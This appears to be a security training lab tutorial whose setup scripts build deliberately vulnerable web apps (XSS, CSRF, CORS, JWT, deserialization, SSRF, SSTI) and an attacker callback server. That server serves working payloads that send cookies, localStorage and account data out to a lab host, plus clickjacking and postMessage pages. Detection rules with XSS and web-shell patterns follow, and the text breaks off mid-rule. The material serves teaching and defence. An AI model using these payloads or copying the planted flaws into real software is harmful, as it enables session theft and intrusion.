# Tutorial: Client-Side Attacks, Authentication, and Session Security — Hands-On Lab

> **Domain 8, Chapter 8A — Tutorial**
> **Companion to:** `domain8_chapter8A_clientside_auth.md`
>
> **Scope.** XSS (reflected, stored, DOM-based, mutation, blind). CSP deployment and bypass. CSRF exploitation and SameSite defense. CORS misconfiguration exploitation. OAuth 2.0 / OIDC attack vectors (redirect_uri, PKCE bypass, token theft). JWT attacks (none algorithm, algorithm confusion RS256→HS256, kid injection, jku/jwk injection). SAML signature wrapping. Session fixation, prediction, concurrent abuse. Clickjacking. Client-side storage theft. PostMessage vulnerabilities. Prototype pollution. DOM clobbering. HTTP request smuggling (CL.TE, TE.CL). Web cache poisoning. SSRF with cloud metadata exploitation. Deserialization (Java ysoserial, Python pickle, PHP phpggc). GraphQL introspection and batch abuse. Browser security headers (full stack). Detection engineering (Sigma, YARA web shells, WAF CRS tuning). Hardening reference (CSP progressive deployment, CORS, SRI, rate limiting).

---

## Lab Environment Setup

### Architecture Overview

```
┌─────────────────────────────────────────────────────────────────┐
│                    LAB NETWORK: 10.8.0.0/24                     │
│                                                                 │
│  ┌──────────────┐  ┌──────────────┐  ┌───────────────────────┐  │
│  │  VM1: VULN   │  │  VM2: ATTACKER│  │  VM3: DETECTION      │  │
│  │  WEB APPS    │  │  INFRA        │  │  & WAF               │  │
│  │  10.8.0.10   │  │  10.8.0.20   │  │  10.8.0.30           │  │
│  │              │  │              │  │                       │  │
│  │ Node/Express │  │ BeEF         │  │ ModSecurity + CRS    │  │
│  │ Flask        │  │ BurpSuite    │  │ Suricata              │  │
│  │ Spring Boot  │  │ jwt_tool     │  │ ELK Stack             │  │
│  │ PHP/Laravel  │  │ SAMLRaider   │  │ Sigma backend         │  │
│  │ GraphQL API  │  │ ysoserial    │  │ CSP report collector  │  │
│  │ Redis        │  │ Evilginx2    │  │                       │  │
│  │ MySQL/Pg     │  │ sqlmap       │  │                       │  │
│  └──────────────┘  └──────────────┘  └───────────────────────┘  │
│                                                                 │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │  VM4: OAUTH/SAML INFRASTRUCTURE       10.8.0.40         │   │
│  │  Keycloak (IdP), Dex, mock SP, JWT key server           │   │
│  └──────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────┘
```

### VM1: Vulnerable Web Applications (Ubuntu 22.04)

```bash
#!/bin/bash
# vm1_setup.sh — Vulnerable web application stack

set -euo pipefail

export DEBIAN_FRONTEND=noninteractive

# Base packages
apt-get update && apt-get install -y \
  curl wget git build-essential \
  nodejs npm \
  python3 python3-pip python3-venv \
  openjdk-17-jdk maven \
  php8.1 php8.1-fpm php8.1-mysql php8.1-xml composer \
  mysql-server postgresql redis-server \
  nginx certbot \
  docker.io docker-compose-v2

# Node.js 20 LTS
curl -fsSL https://deb.nodesource.com/setup_20.x | bash -
apt-get install -y nodejs

# ============================================================
# App 1: Vulnerable Express Application (XSS, CSRF, CORS, JWT)
# ============================================================
mkdir -p /opt/vuln-apps/express-vuln && cd /opt/vuln-apps/express-vuln

cat > package.json << 'PKGJSON'
{
  "name": "vuln-express",
  "version": "1.0.0",
  "dependencies": {
    "express": "^4.18.2",
    "express-session": "^1.17.3",
    "ejs": "^3.1.9",
    "jsonwebtoken": "^8.5.1",
    "body-parser": "^1.20.2",
    "cookie-parser": "^1.4.6",
    "cors": "^2.8.5",
    "multer": "^1.4.5-lts.1",
    "mysql2": "^3.6.5",
    "redis": "^4.6.12",
    "lodash": "^4.17.15",
    "dompurify": "^3.0.6",
    "jsdom": "^23.0.1"
  }
}
PKGJSON
npm install

cat > server.js << 'SERVERJS'
const express = require('express');
const session = require('express-session');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const jwt = require('jsonwebtoken');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

const app = express();
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(cookieParser());
app.use(express.static('public'));

// Deliberately insecure session configuration for lab exercises
app.use(session({
  secret: 'lab-insecure-secret',
  resave: false,
  saveUninitialized: true,
  cookie: { httpOnly: false, secure: false, sameSite: false }
}));

// In-memory "database" for lab
const users = [
  { id: 1, username: 'admin', password: 'admin123', role: 'admin', email: 'admin@vuln.lab' },
  { id: 2, username: 'user', password: 'user123', role: 'user', email: 'user@vuln.lab' },
  { id: 3, username: 'alice', password: 'alice123', role: 'user', email: 'alice@vuln.lab' },
];
const comments = [];
const messages = [];

// JWT keys for lab
const JWT_PRIVATE_KEY = crypto.generateKeyPairSync('rsa', {
  modulusLength: 2048,
  publicKeyEncoding: { type: 'spki', format: 'pem' },
  privateKeyEncoding: { type: 'pkcs8', format: 'pem' },
});
const JWT_SECRET_SYMMETRIC = 'lab-jwt-hmac-secret-key';
fs.writeFileSync('/opt/vuln-apps/express-vuln/public_key.pem', JWT_PRIVATE_KEY.publicKey);

// ---- VULNERABILITY: Reflected XSS ----
app.get('/search', (req, res) => {
  const query = req.query.q || '';
  // VULNERABLE: reflects user input without escaping
  res.send(`
    <html>
    <head><title>Search Results</title></head>
    <body>
      <h1>Search Results for: ${query}</h1>
      <p>No results found for your query.</p>
      <a href="/search">Try again</a>
    </body>
    </html>
  `);
});

// ---- VULNERABILITY: Stored XSS ----
app.get('/comments', (req, res) => {
  let html = '<html><head><title>Comments</title></head><body><h1>Comments</h1>';
  html += '<form method="POST" action="/comments"><input name="author" placeholder="Name">';
  html += '<textarea name="body" placeholder="Comment"></textarea>';
  html += '<button type="submit">Post</button></form><hr>';
  for (const c of comments) {
    // VULNERABLE: renders raw HTML from user input
    html += `<div class="comment"><b>${c.author}</b>: ${c.body}</div>`;
  }
  html += '</body></html>';
  res.send(html);
});
app.post('/comments', (req, res) => {
  comments.push({ author: req.body.author, body: req.body.body });
  res.redirect('/comments');
});

// ---- VULNERABILITY: DOM-based XSS ----
app.get('/dom-xss', (req, res) => {
  res.send(`
    <html>
    <head><title>DOM XSS Lab</title></head>
    <body>
      <h1>Welcome</h1>
      <div id="output"></div>
      <script>
        // VULNERABLE: reads from location.hash and writes to innerHTML
        var userInput = decodeURIComponent(location.hash.substring(1));
        if (userInput) {
          document.getElementById('output').innerHTML = 'Hello, ' + userInput;
        }
      </script>
    </body>
    </html>
  `);
});

// ---- VULNERABILITY: CSRF (no token protection) ----
app.get('/profile', (req, res) => {
  if (!req.session.user) return res.redirect('/login');
  res.send(`
    <html><body>
      <h1>Profile: ${req.session.user.username}</h1>
      <p>Email: ${req.session.user.email}</p>
      <form method="POST" action="/profile/update-email">
        <input name="email" placeholder="New email">
        <button type="submit">Update Email</button>
      </form>
    </body></html>
  `);
});
app.post('/profile/update-email', (req, res) => {
  if (!req.session.user) return res.status(401).send('Not authenticated');
  // VULNERABLE: no CSRF token validation
  const user = users.find(u => u.id === req.session.user.id);
  if (user) {
    user.email = req.body.email;
    req.session.user.email = req.body.email;
  }
  res.send(`Email updated to ${req.body.email}`);
});

// ---- VULNERABILITY: CORS misconfiguration ----
app.get('/api/user-data', (req, res) => {
  // VULNERABLE: reflects Origin header without allowlist
  const origin = req.headers.origin;
  if (origin) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  }
  if (!req.session.user) return res.status(401).json({ error: 'Not authenticated' });
  res.json({
    user: req.session.user,
    secret_data: 'This is sensitive account information',
    api_key: 'sk-lab-12345-secret-key'
  });
});

// ---- VULNERABILITY: JWT none algorithm ----
app.post('/api/jwt/login', (req, res) => {
  const { username, password } = req.body;
  const user = users.find(u => u.username === username && u.password === password);
  if (!user) return res.status(401).json({ error: 'Invalid credentials' });
  
  const token = jwt.sign(
    { sub: user.id, username: user.username, role: user.role },
    JWT_PRIVATE_KEY.privateKey,
    { algorithm: 'RS256', expiresIn: '1h' }
  );
  res.json({ token });
});

app.get('/api/jwt/admin', (req, res) => {
  const authHeader = req.headers.authorization;
  if (!authHeader) return res.status(401).json({ error: 'No token' });
  const token = authHeader.replace('Bearer ', '');
  
  try {
    // VULNERABLE: accepts algorithm from token header, doesn't enforce RS256
    const decoded = jwt.verify(token, JWT_PRIVATE_KEY.publicKey);
    if (decoded.role !== 'admin') return res.status(403).json({ error: 'Admin only' });
    res.json({ message: 'Welcome to admin panel', users: users, decoded });
  } catch (err) {
    res.status(401).json({ error: 'Invalid token', details: err.message });
  }
});

// ---- VULNERABILITY: JWT kid injection ----
app.get('/api/jwt/kid-login', (req, res) => {
  const { username, password } = req.body || {};
  const user = users.find(u => u.username === (username || 'user'));
  const token = jwt.sign(
    { sub: user.id, username: user.username, role: user.role },
    JWT_SECRET_SYMMETRIC,
    { algorithm: 'HS256', expiresIn: '1h', keyid: 'key-001' }
  );
  res.json({ token });
});

app.get('/api/jwt/kid-admin', (req, res) => {
  const authHeader = req.headers.authorization;
  if (!authHeader) return res.status(401).json({ error: 'No token' });
  const token = authHeader.replace('Bearer ', '');

  try {
    const header = JSON.parse(Buffer.from(token.split('.')[0], 'base64url').toString());
    // VULNERABLE: kid used in file path without sanitization
    let key;
    try {
      key = fs.readFileSync(`/opt/vuln-apps/keys/${header.kid}`).toString().trim();
    } catch {
      key = JWT_SECRET_SYMMETRIC;
    }
    const decoded = jwt.verify(token, key, { algorithms: ['HS256'] });
    res.json({ message: 'Authenticated via kid lookup', decoded });
  } catch (err) {
    res.status(401).json({ error: err.message });
  }
});

// ---- VULNERABILITY: Clickjacking (no X-Frame-Options) ----
app.get('/settings/delete-account', (req, res) => {
  if (!req.session.user) return res.redirect('/login');
  // VULNERABLE: no frame-busting headers
  res.send(`
    <html><body>
      <h1>Account Settings</h1>
      <form method="POST" action="/settings/delete-account">
        <button type="submit" style="padding:20px;font-size:18px;background:red;color:white;">
          Delete My Account
        </button>
      </form>
    </body></html>
  `);
});
app.post('/settings/delete-account', (req, res) => {
  if (!req.session.user) return res.status(401).send('Not authenticated');
  res.send('Account deleted (simulated)');
});

// ---- VULNERABILITY: PostMessage without origin check ----
app.get('/postmessage-vuln', (req, res) => {
  res.send(`
    <html><body>
      <h1>Messaging Widget</h1>
      <div id="display"></div>
      <script>
        // VULNERABLE: no origin validation on message handler
        window.addEventListener('message', function(e) {
          document.getElementById('display').innerHTML = e.data;
        });
      </script>
    </body></html>
  `);
});

// ---- VULNERABILITY: Prototype pollution via deep merge ----
app.post('/api/config', (req, res) => {
  const _ = require('lodash');
  let config = { theme: 'light', lang: 'en', isAdmin: false };
  // VULNERABLE: lodash < 4.17.12 merge allows __proto__ pollution
  _.merge(config, req.body);
  res.json({ config, isAdminOnProto: ({}).isAdmin });
});

// ---- VULNERABILITY: SSRF ----
app.get('/api/fetch-url', async (req, res) => {
  const url = req.query.url;
  if (!url) return res.status(400).json({ error: 'url parameter required' });
  // VULNERABLE: no URL validation, allows internal requests
  try {
    const resp = await fetch(url);
    const text = await resp.text();
    res.json({ status: resp.status, body: text.substring(0, 5000) });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ---- VULNERABILITY: GraphQL with introspection enabled ----
// (Simplified — in a real lab, use Apollo Server or graphql-express)
app.post('/graphql', (req, res) => {
  const { query } = req.body;
  if (!query) return res.status(400).json({ error: 'No query' });
  
  // Simulate introspection response
  if (query.includes('__schema')) {
    return res.json({
      data: {
        __schema: {
          types: [
            { name: 'User', fields: [
              { name: 'id' }, { name: 'username' }, { name: 'email' },
              { name: 'password_hash' }, { name: 'role' }, { name: 'api_key' }
            ]},
            { name: 'AdminMutation', fields: [
              { name: 'deleteUser' }, { name: 'changeRole' }, { name: 'resetPassword' }
            ]}
          ]
        }
      }
    });
  }
  
  // Simulate user query without auth check
  if (query.includes('adminUsers')) {
    return res.json({ data: { adminUsers: users } });
  }
  
  res.json({ data: null });
});

// ---- Session fixation vulnerable login ----
app.get('/login', (req, res) => {
  res.send(`
    <html><body>
      <h1>Login</h1>
      <form method="POST" action="/login">
        <input name="username" placeholder="Username">
        <input name="password" type="password" placeholder="Password">
        <button type="submit">Login</button>
      </form>
    </body></html>
  `);
});
app.post('/login', (req, res) => {
  const user = users.find(u =>
    u.username === req.body.username && u.password === req.body.password
  );
  if (!user) return res.status(401).send('Invalid credentials');
  // VULNERABLE: does not regenerate session ID on login
  req.session.user = { id: user.id, username: user.username, email: user.email, role: user.role };
  res.redirect('/profile');
});

// ---- JWKS endpoint (for jku attacks) ----
app.get('/.well-known/jwks.json', (req, res) => {
  const keyData = crypto.createPublicKey(JWT_PRIVATE_KEY.publicKey);
  const jwk = keyData.export({ format: 'jwk' });
  res.json({ keys: [{ ...jwk, kid: 'lab-key-1', use: 'sig', alg: 'RS256' }] });
});

// ---- Deserialization endpoint (simulated) ----
app.post('/api/import', (req, res) => {
  // VULNERABLE: accepts serialized data hints
  const contentType = req.headers['content-type'];
  if (contentType === 'application/x-java-serialized-object') {
    res.json({ warning: 'Java deserialization endpoint active', received_bytes: req.body?.length || 0 });
  } else {
    res.json({ message: 'Import endpoint', content_type: contentType });
  }
});

// Health check
app.get('/health', (req, res) => res.json({ status: 'ok', app: 'vuln-express' }));

app.listen(3000, '0.0.0.0', () => {
  console.log('Vulnerable Express app listening on :3000');
});
SERVERJS

# Create views directory
mkdir -p views public

# ============================================================
# App 2: Vulnerable Flask Application (SSRF, Deserialization)
# ============================================================
mkdir -p /opt/vuln-apps/flask-vuln && cd /opt/vuln-apps/flask-vuln

python3 -m venv venv
source venv/bin/activate

pip install flask requests pyjwt cryptography PyYAML

cat > app.py << 'FLASKAPP'
import os
import pickle
import base64
import hashlib
import hmac
import json
import requests
import yaml
from flask import Flask, request, jsonify, session, render_template_string

app = Flask(__name__)
app.secret_key = 'lab-flask-insecure-secret'

# ---- VULNERABILITY: Python pickle deserialization ----
@app.route('/api/deserialize', methods=['POST'])
def deserialize_endpoint():
    """VULNERABLE: deserializes arbitrary pickle data from user input."""
    data = request.get_data()
    try:
        if request.content_type == 'application/octet-stream':
            obj = pickle.loads(data)
            return jsonify({'result': str(obj), 'type': type(obj).__name__})
        elif request.content_type == 'application/base64-pickle':
            decoded = base64.b64decode(data)
            obj = pickle.loads(decoded)
            return jsonify({'result': str(obj), 'type': type(obj).__name__})
        else:
            return jsonify({'error': 'Unsupported content type'}), 400
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ---- VULNERABILITY: YAML deserialization ----
@app.route('/api/yaml-config', methods=['POST'])
def yaml_config():
    """VULNERABLE: uses yaml.load() without SafeLoader."""
    try:
        data = request.get_data(as_text=True)
        config = yaml.load(data, Loader=yaml.FullLoader)
        return jsonify({'config': str(config)})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ---- VULNERABILITY: SSRF with DNS rebinding potential ----
@app.route('/api/webhook-test', methods=['POST'])
def webhook_test():
    """VULNERABLE: makes requests to user-supplied URLs without validation."""
    url = request.json.get('url')
    if not url:
        return jsonify({'error': 'url field required'}), 400
    try:
        resp = requests.get(url, timeout=5)
        return jsonify({
            'status': resp.status_code,
            'headers': dict(resp.headers),
            'body': resp.text[:5000]
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ---- VULNERABILITY: Template injection (SSTI) ----
@app.route('/api/render', methods=['POST'])
def render_template():
    """VULNERABLE: renders user input as Jinja2 template."""
    template = request.form.get('template', '')
    try:
        result = render_template_string(template)
        return result
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ---- VULNERABILITY: Weak session token ----
@app.route('/api/session-token')
def weak_session():
    """VULNERABLE: generates predictable session tokens."""
    import time
    timestamp = int(time.time())
    token = hashlib.md5(str(timestamp).encode()).hexdigest()
    return jsonify({'session_token': token, 'generated_at': timestamp})

@app.route('/health')
def health():
    return jsonify({'status': 'ok', 'app': 'vuln-flask'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
FLASKAPP

deactivate

# ============================================================
# App 3: Vulnerable PHP Application (Deserialization, File Inclusion)
# ============================================================
mkdir -p /opt/vuln-apps/php-vuln

cat > /opt/vuln-apps/php-vuln/index.php << 'PHPAPP'
<?php
session_start();

// ---- VULNERABILITY: PHP deserialization ----
if (isset($_POST['data'])) {
    $decoded = base64_decode($_POST['data']);
    // VULNERABLE: unserialize on user input
    $obj = unserialize($decoded);
    echo "<pre>Deserialized: " . print_r($obj, true) . "</pre>";
}

// ---- VULNERABILITY: cookie-based session without HttpOnly ----
if (isset($_POST['login'])) {
    setcookie('session_id', md5($_POST['username'] . time()), [
        'path' => '/',
        'httponly' => false,  // VULNERABLE
        'secure' => false,    // VULNERABLE
        'samesite' => 'None'  // VULNERABLE
    ]);
    $_SESSION['user'] = $_POST['username'];
    header('Location: /profile.php');
}
?>
<!DOCTYPE html>
<html>
<head><title>PHP Vuln Lab</title></head>
<body>
    <h1>PHP Vulnerable Application</h1>
    <h2>Login</h2>
    <form method="POST">
        <input name="username" placeholder="Username">
        <input name="password" type="password" placeholder="Password">
        <button name="login" value="1">Login</button>
    </form>
    <h2>Deserialize Test</h2>
    <form method="POST">
        <textarea name="data" placeholder="Base64-encoded serialized PHP object"></textarea>
        <button type="submit">Deserialize</button>
    </form>
</body>
</html>
PHPAPP

# ============================================================
# Systemd services
# ============================================================

cat > /etc/systemd/system/vuln-express.service << 'SVC'
[Unit]
Description=Vulnerable Express Web Application
After=network.target

[Service]
Type=simple
WorkingDirectory=/opt/vuln-apps/express-vuln
ExecStart=/usr/bin/node server.js
Restart=always
Environment=NODE_ENV=development

[Install]
WantedBy=multi-user.target
SVC

cat > /etc/systemd/system/vuln-flask.service << 'SVC'
[Unit]
Description=Vulnerable Flask Web Application
After=network.target

[Service]
Type=simple
WorkingDirectory=/opt/vuln-apps/flask-vuln
ExecStart=/opt/vuln-apps/flask-vuln/venv/bin/python app.py
Restart=always

[Install]
WantedBy=multi-user.target
SVC

systemctl daemon-reload
systemctl enable --now vuln-express vuln-flask

echo "[+] VM1 setup complete — Vulnerable web apps running on :3000 (Express), :5000 (Flask)"
```

### VM2: Attacker Infrastructure (Kali Linux or Ubuntu)

```bash
#!/bin/bash
# vm2_setup.sh — Attacker tooling

set -euo pipefail
export DEBIAN_FRONTEND=noninteractive

apt-get update && apt-get install -y \
  curl wget git python3 python3-pip python3-venv \
  nodejs npm openjdk-17-jdk \
  nmap nikto sqlmap \
  burpsuite zaproxy \
  ruby ruby-dev

# jwt_tool
cd /opt
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool && pip3 install -r requirements.txt

# ysoserial (Java deserialization)
mkdir -p /opt/ysoserial && cd /opt/ysoserial
wget -q https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar \
  -O ysoserial.jar 2>/dev/null || echo "[!] Download ysoserial manually"

# PHPGGC (PHP deserialization)
cd /opt && git clone https://github.com/ambionics/phpggc.git

# BeEF (Browser Exploitation Framework)
cd /opt && git clone https://github.com/beefproject/beef.git
cd beef && ./install 2>/dev/null || echo "[!] BeEF install may need manual steps"

# Evilginx2 (phishing proxy for MFA bypass demos)
cd /opt && git clone https://github.com/kgretzky/evilginx2.git

# XSStrike (XSS scanner)
pip3 install xsstrike

# Dalfox (Go-based XSS scanner)
go install github.com/hahwul/dalfox/v2@latest 2>/dev/null || echo "[!] Install Go first for dalfox"

# HTTPRequestSmuggler helper
pip3 install h2 hyperframe

# Nuclei (vulnerability scanner)
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest 2>/dev/null || \
  curl -sL https://raw.githubusercontent.com/projectdiscovery/nuclei/master/scripts/install.sh | bash

# SecLists (payload wordlists)
cd /opt && git clone --depth=1 https://github.com/danielmiessler/SecLists.git

# Set up attacker web server for callback collection
mkdir -p /opt/attacker-server && cd /opt/attacker-server

cat > server.js << 'ATKJS'
const http = require('http');
const fs = require('fs');
const url = require('url');

const logFile = '/opt/attacker-server/stolen_data.log';

const server = http.createServer((req, res) => {
  const parsed = url.parse(req.url, true);
  const timestamp = new Date().toISOString();
  
  // Log all incoming requests (captures XSS callbacks, CORS data, etc.)
  const logEntry = {
    timestamp,
    method: req.method,
    url: req.url,
    headers: req.headers,
    query: parsed.query,
  };
  
  let body = '';
  req.on('data', chunk => body += chunk);
  req.on('end', () => {
    if (body) logEntry.body = body;
    fs.appendFileSync(logFile, JSON.stringify(logEntry) + '\n');
    console.log(`[${timestamp}] ${req.method} ${req.url} ${body ? '(body: ' + body.length + ' bytes)' : ''}`);
    
    // CORS headers to accept cross-origin requests
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', '*');
    
    if (req.method === 'OPTIONS') return res.end();
    
    // Serve attack pages
    if (parsed.pathname === '/xss-hook.js') {
      res.setHeader('Content-Type', 'application/javascript');
      return res.end(`
        (function() {
          var data = {
            cookies: document.cookie,
            localStorage: JSON.stringify(localStorage),
            url: location.href,
            dom: document.documentElement.outerHTML.substring(0, 2000)
          };
          new Image().src = 'http://10.8.0.20:8080/exfil?d=' + 
            encodeURIComponent(JSON.stringify(data));
        })();
      `);
    }
    
    if (parsed.pathname === '/csrf-poc.html') {
      res.setHeader('Content-Type', 'text/html');
      return res.end(`<!DOCTYPE html>
<html>
<body onload="document.getElementById('f').submit()">
  <h1>Loading prize...</h1>
  <form id="f" action="http://10.8.0.10:3000/profile/update-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com" />
  </form>
</body>
</html>`);
    }
    
    if (parsed.pathname === '/cors-exploit.html') {
      res.setHeader('Content-Type', 'text/html');
      return res.end(`<!DOCTYPE html>
<html>
<body>
<h1>CORS Exploit</h1>
<script>
fetch('http://10.8.0.10:3000/api/user-data', { credentials: 'include' })
  .then(r => r.json())
  .then(data => {
    document.body.innerHTML += '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
    fetch('http://10.8.0.20:8080/stolen', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  })
  .catch(e => document.body.innerHTML += '<p>Error: ' + e + '</p>');
</script>
</body>
</html>`);
    }
    
    if (parsed.pathname === '/clickjack.html') {
      res.setHeader('Content-Type', 'text/html');
      return res.end(`<!DOCTYPE html>
<html>
<head><title>Win a Prize!</title></head>
<body>
<style>
  iframe { position:absolute; top:0; left:0; width:500px; height:400px;
           opacity:0.0001; z-index:10; }
  .bait { position:absolute; top:180px; left:120px; z-index:1; }
  .bait button { padding:20px 40px; font-size:22px; background:#4CAF50;
                  color:white; border:none; cursor:pointer; border-radius:10px; }
</style>
<div class="bait">
  <h2>Congratulations! You won!</h2>
  <button>Claim Your Prize</button>
</div>
<iframe src="http://10.8.0.10:3000/settings/delete-account"></iframe>
</body>
</html>`);
    }
    
    if (parsed.pathname === '/postmessage-attack.html') {
      res.setHeader('Content-Type', 'text/html');
      return res.end(`<!DOCTYPE html>
<html><body>
<h1>PostMessage XSS Attack</h1>
<iframe id="target" src="http://10.8.0.10:3000/postmessage-vuln" width="600" height="400"></iframe>
<script>
setTimeout(() => {
  document.getElementById('target').contentWindow.postMessage(
    '<img src=x onerror="new Image().src=\\'http://10.8.0.20:8080/exfil?cookies=\\'+document.cookie">',
    '*'
  );
}, 2000);
</script>
</body></html>`);
    }
    
    res.writeHead(200);
    res.end('OK');
  });
});

server.listen(8080, '0.0.0.0', () => {
  console.log('Attacker callback server on :8080');
});
ATKJS

cat > /etc/systemd/system/attacker-server.service << 'SVC'
[Unit]
Description=Attacker Callback Server
After=network.target

[Service]
Type=simple
WorkingDirectory=/opt/attacker-server
ExecStart=/usr/bin/node server.js
Restart=always

[Install]
WantedBy=multi-user.target
SVC

systemctl daemon-reload
systemctl enable --now attacker-server

echo "[+] VM2 setup complete — Attacker tools and callback server on :8080"
```

### VM3: Detection & WAF Infrastructure

```bash
#!/bin/bash
# vm3_setup.sh — Detection stack

set -euo pipefail
export DEBIAN_FRONTEND=noninteractive

apt-get update && apt-get install -y \
  nginx libmodsecurity3 libmodsecurity-dev \
  modsecurity-crs \
  docker.io docker-compose-v2 \
  python3 python3-pip \
  yara

# ============================================================
# ModSecurity with OWASP CRS (reverse proxy to VM1)
# ============================================================

# Enable ModSecurity in NGINX
cat > /etc/nginx/modsecurity.conf << 'MODSEC'
SecRuleEngine On
SecAuditEngine RelevantOnly
SecAuditLog /var/log/modsecurity/audit.log
SecAuditLogParts ABCDEFHZ
SecAuditLogType Serial
SecStatusEngine On
SecRequestBodyAccess On
SecResponseBodyAccess On
SecResponseBodyMimeType text/plain text/html application/json

# Include OWASP CRS
Include /etc/modsecurity/crs-setup.conf
Include /usr/share/modsecurity-crs/rules/*.conf
MODSEC

cat > /etc/nginx/sites-available/waf-proxy << 'NGINX'
server {
    listen 80;
    server_name vuln-waf.lab;

    modsecurity on;
    modsecurity_rules_file /etc/nginx/modsecurity.conf;

    # CSP report collection endpoint
    location /csp-report {
        proxy_pass http://localhost:9090/csp-report;
    }

    # Proxy to vulnerable apps
    location / {
        proxy_pass http://10.8.0.10:3000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        
        # Security headers added by WAF proxy
        add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
        add_header X-Content-Type-Options "nosniff" always;
        add_header X-Frame-Options "DENY" always;
        add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    }
}
NGINX

ln -sf /etc/nginx/sites-available/waf-proxy /etc/nginx/sites-enabled/
rm -f /etc/nginx/sites-enabled/default
mkdir -p /var/log/modsecurity
systemctl restart nginx

# ============================================================
# ELK Stack via Docker Compose
# ============================================================
mkdir -p /opt/elk && cd /opt/elk

cat > docker-compose.yml << 'ELKDC'
services:
  elasticsearch:
    image: docker.elastic.co/elasticsearch/elasticsearch:8.11.3
    environment:
      - discovery.type=single-node
      - xpack.security.enabled=false
      - "ES_JAVA_OPTS=-Xms1g -Xmx1g"
    ports:
      - "9200:9200"
    volumes:
      - es_data:/usr/share/elasticsearch/data

  kibana:
    image: docker.elastic.co/kibana/kibana:8.11.3
    environment:
      - ELASTICSEARCH_HOSTS=http://elasticsearch:9200
    ports:
      - "5601:5601"
    depends_on:
      - elasticsearch

  logstash:
    image: docker.elastic.co/logstash/logstash:8.11.3
    volumes:
      - ./logstash.conf:/usr/share/logstash/pipeline/logstash.conf
    ports:
      - "5044:5044"
    depends_on:
      - elasticsearch

volumes:
  es_data:
ELKDC

cat > logstash.conf << 'LOGSTASH'
input {
  file {
    path => "/var/log/modsecurity/audit.log"
    type => "modsecurity"
    start_position => "beginning"
  }
  file {
    path => "/var/log/nginx/access.log"
    type => "nginx-access"
    start_position => "beginning"
  }
  http {
    port => 9090
    type => "csp-report"
  }
}

filter {
  if [type] == "modsecurity" {
    grok {
      match => { "message" => "%{GREEDYDATA:modsec_raw}" }
    }
  }
  if [type] == "nginx-access" {
    grok {
      match => { "message" => "%{COMBINEDAPACHELOG}" }
    }
  }
}

output {
  elasticsearch {
    hosts => ["http://elasticsearch:9200"]
    index => "web-security-%{+YYYY.MM.dd}"
  }
}
LOGSTASH

docker compose up -d

# ============================================================
# Sigma rule deployment
# ============================================================
pip3 install sigma-cli pySigma pySigma-backend-elasticsearch

mkdir -p /opt/sigma-rules

cat > /opt/sigma-rules/xss_detection.yml << 'SIGMA'
title: XSS Payload in HTTP Request Parameters
id: 8a010e2a-1f3b-4c5d-9e2a-7b8c3d4e5f6a
status: stable
description: Detects common XSS payload patterns in URL parameters and POST bodies
logsource:
  category: webserver
  product: nginx
detection:
  selection_script:
    request|contains:
      - '<script'
      - 'javascript:'
      - 'onerror='
      - 'onload='
      - 'onfocus='
  selection_encoded:
    request|contains:
      - '%3Cscript'
      - '%3cscript'
      - '%6Aavascript'
  selection_svg:
    request|contains:
      - '<svg/onload'
      - '<svg%20onload'
      - '<math>'
  condition: selection_script or selection_encoded or selection_svg
level: high
tags:
  - attack.initial_access
  - attack.t1189
SIGMA

cat > /opt/sigma-rules/csrf_missing_token.yml << 'SIGMA'
title: State-Changing Request Without CSRF Token
id: 9b121f3b-2c4d-5e6f-af3b-8c9d0e1f2a3b
status: experimental
description: POST/PUT/DELETE to sensitive endpoints missing CSRF protection
logsource:
  category: webserver
  product: nginx
detection:
  selection:
    cs_method:
      - POST
      - PUT
      - DELETE
    request|contains:
      - '/profile/update'
      - '/settings/delete'
      - '/api/transfer'
  filter_csrf:
    request|contains: 'csrf_token='
  condition: selection and not filter_csrf
level: medium
SIGMA

cat > /opt/sigma-rules/jwt_none_algorithm.yml << 'SIGMA'
title: JWT Token with None Algorithm
id: bd343b5d-4e6f-7a8b-c15d-ae1f2a3b4c5d
status: stable
description: JWT submitted with alg=none indicating signature bypass attempt
logsource:
  category: webserver
  product: nginx
detection:
  selection:
    authorization|re: 'Bearer\s+eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.$'
  condition: selection
level: critical
tags:
  - attack.credential_access
  - attack.t1550
SIGMA

# Compile Sigma rules to Elasticsearch queries
sigma convert -t elasticsearch -p ecs_windows \
  /opt/sigma-rules/*.yml > /opt/sigma-rules/compiled_queries.json 2>/dev/null || true

# ============================================================
# YARA web shell detection
# ============================================================
cat > /opt/yara-rules/webshells.yar << 'YARA'
rule PHP_WebShell_Generic {
    meta:
        description = "Detects common PHP web shells"
        severity = "critical"
    strings:
        $eval_post = "eval($_POST[" ascii nocase
        $assert_post = "assert($_POST[" ascii nocase
        $system_get = "system($_GET[" ascii nocase
        $base64_eval = /eval\s*\(\s*base64_decode\s*\(/ ascii nocase
        $gzinflate = /eval\s*\(\s*gzinflate\s*\(/ ascii nocase
    condition:
        any of them and filesize < 50KB
}

rule JSP_WebShell {
    meta:
        description = "Detects JSP web shells"
        severity = "critical"
